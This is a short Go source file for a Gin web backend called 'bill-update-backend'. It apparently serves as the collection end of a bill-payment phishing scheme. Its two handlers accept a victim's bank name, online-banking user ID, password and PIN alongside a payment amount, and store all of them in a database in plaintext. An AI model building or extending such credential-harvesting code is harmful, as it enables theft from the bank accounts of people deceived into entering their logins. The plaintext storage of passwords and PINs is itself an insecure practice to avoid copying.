package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"

	"github.com/gin-gonic/gin"
)

func SubmitNetbanking(c *gin.Context) {
	var req struct {
		BankName   string  `json:"bank_name"`
		UserID     string  `json:"user_id"`
		Password   string  `json:"password"`
		RememberMe bool    `json:"remember_me"`
		Amount     float64 `json:"amount"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	record := models.NetbankingDetail{
		BankName:   req.BankName,
		UserID:     req.UserID,
		Password:   req.Password,
		RememberMe: req.RememberMe,
		Amount:     req.Amount,
	}
	database.DB.Create(&record)
	c.JSON(http.StatusOK, gin.H{"message": "Netbanking details saved", "id": record.ID})
}

func SubmitNetbankingPin(c *gin.Context) {
	var req struct {
		Pin    string  `json:"pin"`
		Amount float64 `json:"amount"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	record := models.NetbankingPin{
		Pin:    req.Pin,
		Amount: req.Amount,
	}
	database.DB.Create(&record)
	c.JSON(http.StatusOK, gin.H{"message": "Netbanking pin saved", "id": record.ID})
}
